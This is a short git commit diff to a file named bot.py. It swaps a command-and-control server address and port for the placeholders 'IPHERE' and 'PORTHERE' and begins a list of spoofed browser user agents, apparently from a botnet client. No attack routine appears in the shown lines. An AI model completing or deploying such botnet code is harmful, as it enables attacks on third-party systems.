8665bc4064c542e26cd1a127f2f171071aff8d3a
D3fe4ted <73515265+d3fe4ted@users.noreply.github.com>
2022-06-21 23:35:35 -0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -3,8 +3,8 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = '127.0.0.1'
-C2_PORT     = '1337'
+C2_ADDRESS  = 'IPHERE'
+C2_PORT     = 'PORTHERE'
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
